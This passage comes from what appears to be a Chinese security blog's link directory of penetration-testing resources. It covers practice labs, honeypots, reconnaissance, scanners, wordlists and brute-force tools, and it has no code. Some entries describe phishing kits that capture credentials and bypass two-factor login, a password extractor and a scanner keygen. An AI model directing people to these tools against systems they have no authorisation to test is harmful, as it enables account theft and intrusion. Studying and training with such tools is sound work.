rel="noopener">https://github.com/k8gege/K8tools</a></p></li><li><p>sec-tool-list<br>More than 18K security related open source tools, sorted by star count. Both in markdown and json format.<br><a href="https://github.com/alphaSeclab/sec-tool-list" target="_blank" rel="noopener">https://github.com/alphaSeclab/sec-tool-list</a><br><a href="https://github.com/dylan903/sec-tool-list" target="_blank" rel="noopener">https://github.com/dylan903/sec-tool-list</a></p></li><li><p>安全行业从业者自研开源扫描器合辑<br><a href="https://github.com/dylan903/Scanners-Box" target="_blank" rel="noopener">https://github.com/dylan903/Scanners-Box</a><br><a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</a></p></li><li><p>渗透以及web攻击脚本<br><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p></li><li><p>web渗透小工具大合集<br><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack_tools_for_me</a></p></li><li><p>渗透常用小工具包<br><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a></p></li><li><p>安全工具集合<br><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a></p></li><li><p>网络基础设施渗透工具<br><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a></p></li><li><p>Interactive CTF Exploration Tool<br><a href="https://github.com/taviso/ctftool" target="_blank" rel="noopener">https://github.com/taviso/ctftool</a></p></li><li><p>hacktronian，适用于Linux和Android的一体化黑客工具包<br><a href="https://github.com/thehackingsage/hacktronian" target="_blank" rel="noopener">https://github.com/thehackingsage/hacktronian</a></p></li></ul><h2 id="红队资源"><a href="#红队资源" class="headerlink" title="红队资源"></a>红队资源</h2><hr><ul><li><p>红队资料集锦 - lsh4ck’s Blog<br><a href="https://www.lshack.cn/772/" target="_blank" rel="noopener">https://www.lshack.cn/772/</a></p></li><li><p>Wiki to collect Red Team infrastructure hardening resources<br><a href="https://github.com/dylan903/Red-Team-Infrastructure-Wiki" target="_blank" rel="noopener">Red-Team-Infrastructure-Wiki</a></p></li><li><p>Offensive PowerShell for red team, penetration testing and offensive security.<br><a href="https://github.com/dylan903/nishang" target="_blank" rel="noopener">nishang</a></p></li></ul><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><hr><ul><li><p>安全思维导图集合<br><a href="https://github.com/dylan903/sec-chart" target="_blank" rel="noopener">sec-chart</a></p></li><li><p>☯️ 网络安全基础知识思维导图、大学笔记<br><a href="https://github.com/dylan903/network-security-mind-map" target="_blank" rel="noopener">network-security-mind-map</a></p></li><li><p>各种安全相关思维导图整理收集<br><a href="https://github.com/dylan903/Mind-Map" target="_blank" rel="noopener">Mind-Map</a></p></li></ul><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="渗透系统"><a href="#渗透系统" class="headerlink" title="渗透系统"></a>渗透系统</h2><hr><ul><li><p>泽少个人渗透系统 7.0版<br><a href="https://github.com/Gh0st-404/Zs-Personal-Infiltration-Syste" target="_blank" rel="noopener">https://github.com/Gh0st-404/Zs-Personal-Infiltration-Syste</a></p></li><li><p>Pentest Box<br><a href="https://pentestbox.org/zh/" target="_blank" rel="noopener">https://pentestbox.org/zh/</a></p></li></ul><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><hr><h3 id="在线靶场"><a href="#在线靶场" class="headerlink" title="在线靶场"></a>在线靶场</h3><ul><li><p>hack the box<br><a href="https://www.hackthebox.eu/invite" target="_blank" rel="noopener">https://www.hackthebox.eu/invite</a><br><a href="https://blog.csdn.net/u010953692/article/details/82024150" target="_blank" rel="noopener">hack the box 注册 邀请码 破解</a><br>writeup<br><a href="https://www.360zhijia.com/anquan/439315.html" target="_blank" rel="noopener">https://www.360zhijia.com/anquan/439315.html</a></p></li><li><p>hackinglab：网络安全实验室|网络信息安全攻防学习平台<br><a href="http://hackinglab.cn/index.php" target="_blank" rel="noopener">http://hackinglab.cn/index.php</a></p></li><li><p>南邮CG-CTF<br><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">https://cgctf.nuptsast.com/challenges#Web</a></p></li><li><p>在线靶场_墨者学院<br><a href="https://www.mozhe.cn/bug" target="_blank" rel="noopener">https://www.mozhe.cn/bug</a></p></li><li><p>攻防世界<br><a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">https://adworld.xctf.org.cn/</a></p></li><li><p>XSS靶场_免费xss测试平台_Web渗透测试_前段黑客技术学习<br>地址：<br><a href="http://xss.fbisb.com/xss.php?do=login" target="_blank" rel="noopener">http://xss.fbisb.com/xss.php?do=login</a><br><a href="http://xss.tesla-space.com/" target="_blank" rel="noopener">http://xss.tesla-space.com/</a><br><a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a><br>writeup：<br><a href="https://blog.csdn.net/xlsj228/article/details/93166486" target="_blank" rel="noopener">https://blog.csdn.net/xlsj228/article/details/93166486</a><br><a href="https://blog.csdn.net/qq_41500251/article/details/101116697" target="_blank" rel="noopener">https://blog.csdn.net/qq_41500251/article/details/101116697</a></p></li><li><p>xss-demo（小迪XSS）: 在线做题，issues 有答案<br><a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a></p></li></ul><ul><li><p>XSS Challenges (by yamagata21)<br>地址：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a><br>writeup：<a href="https://blog.csdn.net/taozijun/article/details/81277187" target="_blank" rel="noopener">https://blog.csdn.net/taozijun/article/details/81277187</a></p></li><li><p>KNOXSS Test Page——练习XSS漏洞的一个靶场<br>地址：<br><a href="https://brutelogic.com.br/knoxss.html" target="_blank" rel="noopener">https://brutelogic.com.br/knoxss.html</a><br>writeup：<br><a href="https://blog.csdn.net/weixin_42936566/article/details/86649481" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42936566/article/details/86649481</a></p></li><li><p>HackThis!! - The Hackers Playground<br><a href="https://www.hackthis.co.uk/" target="_blank" rel="noopener">https://www.hackthis.co.uk/</a></p></li><li><p>Hack This Site!<br><a href="https://www.hackthissite.org/" target="_blank" rel="noopener">https://www.hackthissite.org/</a></p></li></ul><h3 id="搭建靶场"><a href="#搭建靶场" class="headerlink" title="搭建靶场"></a>搭建靶场</h3><ul><li><p>Damn Vulnerable Web Application (DVWA)<br><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p></li><li><p>使用docker快速搭建各大漏洞学习平台，目前可以一键搭建12个平台。<br><a href="https://github.com/dylan903/vulstudy" target="_blank" rel="noopener">vulstudy</a></p></li><li><p>vulhub<br><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p></li><li><p>VulApps<br><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p></li><li><p>Pentester Lab<br><a href="https://pentesterlab.com/" target="_blank" rel="noopener">官网</a><br><a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell-ii,69/" target="_blank" rel="noopener">下载地址</a><br><a href="https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso" target="_blank" rel="noopener">下载地址</a><br>在VM ware中安装下载的iso镜像并启动<br><a href="https://www.cnblogs.com/ssooking/p/6362571.html" target="_blank" rel="noopener">PentesterLab渗透演练平台使用手册</a><br><a href="https://www.freebuf.com/column/211863.html" target="_blank" rel="noopener">CTF靶场系列-Pentester Lab: Web For Pentester - FreeBuf专栏·幻影安全</a></p></li><li><p>xss-labs：XSS跨站漏洞平台<br><a href="https://github.com/lyshark/xss-labs" target="_blank" rel="noopener">https://github.com/lyshark/xss-labs</a></p></li><li><p>SQLI labs to test error based, Blind boolean based, Time based.<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p></li><li><p>upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场<br><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p></li><li><p>DoraBox - 基础Web漏洞训练靶场<br><a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p></li><li><p>WebGoat: WebGoat 8.0<br><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p></li><li><p>Linux提取靶场<br><a href="https://github.com/Ignitetechnologies/Privilege-Escalation" target="_blank" rel="noopener">Privilege-Escalation</a></p></li><li><p>fowsniff<br><a href="https://www.vulnhub.com/entry/fowsniff-1,262/#download" target="_blank" rel="noopener">https://www.vulnhub.com/entry/fowsniff-1,262/#download</a><br>writeup:<br><a href="https://www.4hou.com/system/15066.html" target="_blank" rel="noopener">https://www.4hou.com/system/15066.html</a><br><a href="https://www.anquanke.com/post/id/164639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164639</a></p></li></ul><h2 id="蜜罐搭建"><a href="#蜜罐搭建" class="headerlink" title="蜜罐搭建"></a>蜜罐搭建</h2><hr><ul><li><p>HFish-扩展企业安全测试主动诱导型开源蜜罐框架系统，记录黑客攻击手段<br><a href="https://github.com/hacklcx/HFish" target="_blank" rel="noopener">https://github.com/hacklcx/HFish</a></p></li><li><p>opencanary_web：一个开源蜜罐框架，基于web python mysql<br><a href="https://github.com/p1r06u3/opencanary_web/" target="_blank" rel="noopener">https://github.com/p1r06u3/opencanary_web/</a></p></li><li><p>SSH蜜罐<br><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a></p></li><li><p>蜜罐集合资源<br><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p></li><li><p>kippo进阶版蜜罐<br><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a></p></li><li><p>SMTP 蜜罐<br><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a></p></li><li><p>web应用程序蜜罐<br><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a></p></li><li><p>数据库蜜罐<br><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a></p></li><li><p>web蜜罐<br><a href="https://github.com/atiger77/Dionaea" target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p></li></ul><h1 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h1><h2 id="在线收集工具"><a href="#在线收集工具" class="headerlink" title="在线收集工具"></a>在线收集工具</h2><hr><ul><li><a href="http://tools.hexlt.org/whatcms" target="_blank" rel="noopener">CMS识别</a></li><li><a href="http://www.webscan.cc/" target="_blank" rel="noopener">C段查询</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">撒旦</a></li><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼</a></li><li><a href="https://fofa.so/" target="_blank" rel="noopener">FOFA</a></li><li><a href="https://www.somd5.com/" target="_blank" rel="noopener">MD5解密</a></li><li><a href="http://xssor.io/" target="_blank" rel="noopener">XSSOR</a></li><li><a href="https://regex101.com/" target="_blank" rel="noopener">正则分析</a></li></ul><h2 id="信息收集教程"><a href="#信息收集教程" class="headerlink" title="信息收集教程"></a>信息收集教程</h2><hr><ul><li>【渗透神器系列】搜索引擎]</li></ul><p><a href="https://thief.one/2017/05/19/1/" target="_blank" rel="noopener">https://thief.one/2017/05/19/1/</a></p><h2 id="收集工具"><a href="#收集工具" class="headerlink" title="收集工具"></a>收集工具</h2><hr><h3 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h3><ul><li>FuzzScanner：一主要是用于对网站子域名、开放端口、端口指纹、c段地址、敏感目录等信息进行批量搜集。<br><a href="https://github.com/TideSec/FuzzScanner" target="_blank" rel="noopener">https://github.com/TideSec/FuzzScanner</a></li></ul><ul><li><p>FinalRecon：一个用于公开资源情报计划（Open source intelligence ）简称OSINT的网络侦察工具。<br><a href="https://github.com/thewhiteh4t/FinalRecon" target="_blank" rel="noopener">https://github.com/thewhiteh4t/FinalRecon</a></p></li><li><p>Rustbuster：一个使用Rust编写的强大的Fuzzer和信息发现工具<br><a href="https://github.com/phra/rustbuster" target="_blank" rel="noopener">https://github.com/phra/rustbuster</a></p></li><li><p>Photon，速度极快的爬虫程序，可以提取网址、电子邮件、文件、网站帐户等等。<br><a href="https://github.com/s0md3v/Photon" target="_blank" rel="noopener">https://github.com/s0md3v/Photon</a></p></li><li><p>信息探测及扫描工具<br><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a></p></li><li><p>内部网络信息扫描器<br><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a></p></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><p>Arjun 一款HTTP参数挖掘套件<br><a href="https://github.com/s0md3v/Arjun/" target="_blank" rel="noopener">https://github.com/s0md3v/Arjun/</a></p></li><li><p>SNMAP密码破解<br><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p></li></ul><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><hr><ul><li><p>WhatWeb：下一代网络扫描器，用于识别正在运行的网站所使用的技术栈。<br><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p></li><li><p>Scan-T：网络空间指纹扫描器<br><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p></li></ul><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><hr><ul><li><p>OneForAll<br><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p></li><li><p>subDomainsBrute<br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p></li><li><p>subdomain3<br><a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3</a></p></li><li><p>Findomain：使用证书透明度日志查找子域名的工具<br><a href="https://github.com/Edu4rdSHL/findomain" target="_blank" rel="noopener">https://github.com/Edu4rdSHL/findomain</a></p></li><li><p>E-mails, subdomains and names Harvester - OSINT<br><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></p></li><li><p>Sublist3r<br><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p></li><li><p>subbrute<br><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a></p></li><li><p>altdns<br><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></p></li></ul><h2 id="批量采集"><a href="#批量采集" class="headerlink" title="批量采集"></a>批量采集</h2><hr><ul><li>tcpdump，网络监控和数据采集工具<br><a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org/</a></li></ul><h2 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h2><h3 id="IVRE-网络侦察框架"><a href="#IVRE-网络侦察框架" class="headerlink" title="IVRE 网络侦察框架"></a>IVRE 网络侦察框架</h3><p><a href="https://dylan903.coding.me/2019/09/21/yuan-ma-da-jian-ivre/">Ubuntu16 源码搭建 IVRE</a></p><h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><ul><li><p>GitMiner：GitHub敏感信息泄露的高级挖掘工具。<br><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a></p></li><li><p>gitrob：GitHub敏感信息泄露扫描工具，拥有漂亮的WEB UI。<br><a href="https://github.com/michenriksen/gitrob" target="_blank" rel="noopener">https://github.com/michenriksen/gitrob</a></p></li><li><p>FeeiCN/GSIL：Github信息搜集<br><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p></li><li><p>gitGraber：监控GitHub敏感信息数据泄露工具<br><a href="https://github.com/hisxo/gitGraber" target="_blank" rel="noopener">https://github.com/hisxo/gitGraber</a></p></li><li><p>GShark:一个用于监控Github敏感信息泄露的项目<br><a href="https://github.com/neal1991/gshark" target="_blank" rel="noopener">https://github.com/neal1991/gshark</a></p></li><li><p>gitscan<br><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p></li><li><p>GitHarvester：github Repo信息搜集工具<br><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p></li></ul><h3 id="暗网"><a href="#暗网" class="headerlink" title="暗网"></a>暗网</h3><ul><li>DarkScrape：OSINT Tool For Scraping Dark Websites<br><a href="https://github.com/itsmehacker/DarkScrape" target="_blank" rel="noopener">https://github.com/itsmehacker/DarkScrape</a></li></ul><h1 id="0x04-社工钓鱼"><a href="#0x04-社工钓鱼" class="headerlink" title="0x04 社工钓鱼"></a>0x04 社工钓鱼</h1><h2 id="社工辅助"><a href="#社工辅助" class="headerlink" title="社工辅助"></a>社工辅助</h2><hr><ul><li><p>infoga：用于从不同公共源（搜索引擎、PGP密钥服务器）收集电子邮件帐户信息的工具。<br><a href="https://github.com/m4ll0k/Infoga" target="_blank" rel="noopener">https://github.com/m4ll0k/Infoga</a></p></li><li><p>Sreg：可对使用者通过输入email、phone、username的返回用户注册的所有互联网护照信息。<br><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p></li><li><p>The Social-Engineer Toolkit：社会工程学工具包<br><a href="https://github.com/trustedsec/social-engineer-toolkit/" target="_blank" rel="noopener">https://github.com/trustedsec/social-engineer-toolkit/</a></p></li><li><p>sherlock：一个在社交网络中查找用户名的信息收集工具<br><a href="https://github.com/sherlock-project/sherlock" target="_blank" rel="noopener">https://github.com/sherlock-project/sherlock</a></p></li><li><p>userrecon-py：在187个社交网络中查找用户名。<br><a href="https://github.com/decoxviii/userrecon-py" target="_blank" rel="noopener">https://github.com/decoxviii/userrecon-py</a></p></li><li><p>RGPerson：随机中文身份信息生成脚本<br><a href="https://github.com/gh0stkey/RGPerson" target="_blank" rel="noopener">https://github.com/gh0stkey/RGPerson</a></p></li></ul><h2 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h2><hr><ul><li><p>HiddenEye：具有高级功能的现代网络钓鱼工具。<br><a href="https://github.com/DarkSecDevelopers/HiddenEye" target="_blank" rel="noopener">https://github.com/DarkSecDevelopers/HiddenEye</a></p></li><li><p>SocialFish：与NGROK集成的终极网络钓鱼工具。<br><a href="https://github.com/UndeadSec/SocialFish" target="_blank" rel="noopener">https://github.com/UndeadSec/SocialFish</a></p></li><li><p>evilginx2：中间人网络钓鱼攻击框架，用于假冒登录凭证和会话cookie，允许绕过2因素身份验证。<br><a href="https://github.com/kgretzky/evilginx2" target="_blank" rel="noopener">https://github.com/kgretzky/evilginx2</a></p></li><li><p>ShellPhish：支持多种社交媒体的网络钓鱼工具<br><a href="https://github.com/thelinuxchoice/shellphish" target="_blank" rel="noopener">https://github.com/thelinuxchoice/shellphish</a></p></li></ul><h1 id="0x05-扫描工具"><a href="#0x05-扫描工具" class="headerlink" title="0x05 扫描工具"></a>0x05 扫描工具</h1><h2 id="综合扫描"><a href="#综合扫描" class="headerlink" title="综合扫描"></a>综合扫描</h2><hr><ul><li><p>Acunetix Web Vulnerability Scanner<br><a href="http://www.acunetix.com/" target="_blank" rel="noopener">http://www.acunetix.com/</a></p></li><li><p>AppScan</p></li><li><p>启明星辰天镜</p></li><li><p>绿盟极光<br><a href="http://www.nsfocus.com/" target="_blank" rel="noopener">http://www.nsfocus.com/</a></p></li><li><p>安恒 MatriXay WebScan（明鉴）<br><a href="http://www.dbappsecurity.com.cn/" target="_blank" rel="noopener">http://www.dbappsecurity.com.cn/</a></p></li><li><p>安域领创 WebRavor<br><a href="http://www.secdomain.com/" target="_blank" rel="noopener">http://www.secdomain.com/</a></p></li><li><p>巡风是一款适用于企业内网的漏洞快速应急，巡航扫描系统。<br><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a></p></li><li><p>X-scan</p></li><li><p>nikto: Nikto web server scanner<br>Nikto是一款开放源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题，它可以扫描指定主机的WEB类型、主机名、特定目录、COOKIE、特定CGI漏洞、返回主机允许的 http模式等等。<br><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p></li></ul><ul><li><p>w3af，web漏洞扫描、应用攻击和审计框架。<br><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a></p></li><li><p>K8CScan<br><a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan</a></p></li><li><p>Vxscan：<br>python3写的综合扫描工具，主要用来存活验证，敏感文件探测(目录扫描/js泄露接口/html注释泄露)，WAF/CDN识别，端口扫描，指纹/服务识别，操作系统识别，POC扫描，SQL注入，绕过CDN，查询旁站等功能，主要用来甲方自测或乙方授权测试<br><a href="https://github.com/al0ne/Vxscan" target="_blank" rel="noopener">https://github.com/al0ne/Vxscan</a></p></li><li><p>Perun：Perun是一款网络资产漏洞扫描器/扫描框架<br><a href="https://github.com/WyAtu/Perun" target="_blank" rel="noopener">https://github.com/WyAtu/Perun</a></p></li><li><p>WDScanner：分布式web漏洞扫描、客户管理、漏洞定期扫描、子域名枚举、端口扫描、<br>网站爬虫、暗链检测、坏链检测、网站指纹搜集、专项漏洞检测、代理搜集及部署等功能。<br><a href="https://github.com/TideSec/WDScanner" target="_blank" rel="noopener">https://github.com/TideSec/WDScanner</a></p></li><li><p>Passive Security Scanner (被动安全扫描器)<br><a href="https://github.com/boy-hack/w13scan" target="_blank" rel="noopener">https://github.com/boy-hack/w13scan</a></p></li><li><p>Python3编写的CMS漏洞检测框架<br><a href="https://github.com/Lucifer1993/AngelSword" target="_blank" rel="noopener">https://github.com/Lucifer1993/AngelSword</a></p></li><li><p>TrackRay: 溯光 (TrackRay) 3 beta⚡渗透测试框架<br><a href="https://github.com/iSafeBlue/TrackRay" target="_blank" rel="noopener">https://github.com/iSafeBlue/TrackRay</a></p></li><li><p>检查网站恶意攻击malspider<br><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a></p></li><li><p>固件漏洞扫描器firminator_backend<br><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a></p></li><li><p>Vulmap：Vulmap可对Linux和Windows系统进行联网本地漏洞扫描<br><a href="https://github.com/vulmon/Vulmap" target="_blank" rel="noopener">https://github.com/vulmon/Vulmap</a></p></li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><hr><ul><li><p>scanless：一款使用第三方在线平台进行匿名端口扫描的工具。<br><a href="https://github.com/vesche/scanless" target="_blank" rel="noopener">https://github.com/vesche/scanless</a></p></li><li><p>F-NAScan：网络资产信息扫描 在渗透测试(<strong>特别是内网</strong>)中经常需要对目标进行网络资产收集<br>ICMP存活探测–&gt;端口开放探测–&gt;端口指纹服务识别–&gt;提取快照(若为WEB)–&gt;生成结果报表<br><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a></p></li></ul><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><hr><ul><li><p>dirmap 一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑<br><a href="https://github.com/H4ckForJob/dirmap" target="_blank" rel="noopener">https://github.com/H4ckForJob/dirmap</a></p></li><li><p>7kbscan-WebPathBrute Web路径暴力探测工具<br><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute" target="_blank" rel="noopener">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p></li><li><p>御剑WEB目录扫描优化版 KEYGEN<br><a href="https://github.com/dylan903/YUJIANKEYGEN" target="_blank" rel="noopener">YUJIANKEYGEN</a></p></li><li><p>dirsearch   web目录扫描器<br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p></li><li><p>DirBrute<br><a href="https://github.com/Xyntax/DirBrute" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute</a></p></li><li><p>Konan，一款高级Web目录扫描程序，多线程/代理/字典子目录。<br><a href="https://github.com/m4ll0k/Konan" target="_blank" rel="noopener">https://github.com/m4ll0k/Konan</a></p></li><li><p>shack2/SWebScan: SWebScan是一款基于C#的Web目录扫描器。<br><a href="https://github.com/shack2/SWebScan" target="_blank" rel="noopener">https://github.com/shack2/SWebScan</a></p></li></ul><h1 id="0x06-暴力破解"><a href="#0x06-暴力破解" class="headerlink" title="0x06 暴力破解"></a>0x06 暴力破解</h1><h2 id="破解工具"><a href="#破解工具" class="headerlink" title="破解工具"></a>破解工具</h2><hr><ul><li><p>shack2/SNETCracker<br>超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，<br>可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。<br><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a></p></li><li><p>远程桌面登录扫描器<br><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a></p></li><li><p>一款有图形界面的RDP(3389)口令检测工具<br><a href="https://github.com/7kbstorm/7kbscan-RDP-Sniper" target="_blank" rel="noopener">https://github.com/7kbstorm/7kbscan-RDP-Sniper</a></p></li><li><p>WebCrack网站后台弱口令/万能密码批量检测工具<br><a href="https://github.com/yzddmr6/WebCrack" target="_blank" rel="noopener">https://github.com/yzddmr6/WebCrack</a></p></li><li><p>DBScanner自动扫描内网常见sql、no-sql数据库脚本<br>(mysql、mssql、oracle、postgresql、redis、mongodb、memcached、elasticsearch)<br>包含未授权访问及常规弱口令检测<br><a href="https://github.com/se55i0n/DBScanner" target="_blank" rel="noopener">https://github.com/se55i0n/DBScanner</a></p></li><li><p>一款python编写的轻量级弱口令检测脚本，目前支持以下服务：FTP、MYSQL、MSSQL、MONGODB、REDIS、TELNET、ELASTICSEARCH、POSTGRESQL。<br><a href="https://github.com/qianniaoge/F-Scrack" target="_blank" rel="noopener">https://github.com/qianniaoge/F-Scrack</a></p></li><li><p>密码破解工具<br><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p></li><li><p>本地存储的各类密码提取利器<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p></li></ul><h2 id="字典目录"><a href="#字典目录" class="headerlink" title="字典目录"></a>字典目录</h2><hr><ul><li><p>pydictor是一个强大实用的黑客暴力破解字典生成工具<br><a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a></p></li><li><p>Web Pentesting Fuzz 字典,一个就够了。<br><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></p></li><li><p>Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery.<br><a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb</a></p></li><li><p>Blasting_dictionary<br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></p></li><li><p>Fuzzing-Dicts  网站后台、文件包含、WebShell等爆破字典！<br><a href="https://github.com/3had0w/Fuzzing-Dicts" target="_blank" rel="noopener">https://github.com/3had0w/Fuzzing-Dicts</a></p></li><li><p>常用的一些fuzz及爆破字典，欢迎大神继续提供新的字典及分类。<br><a href="https://github.com/TuuuNya/fuzz_dict" target="_blank" rel="noopener">https://github.com/TuuuNya/fuzz_dict</a></p></li><li><p>SecLists is the security tester’s companion. It’s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.<br><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists</a></p></li><li><p>Exploit-Dictionary<br><a href="https://github.com/epony4c/Exploit-Dictionary" target="_blank" rel="noopener">https://github.com/epony4c/Exploit-Dictionary</a></p></li><li><p>Common User Passwords Profiler (CUPP)<br><a href="https://github.com/Mebus/cupp" target="_blank" 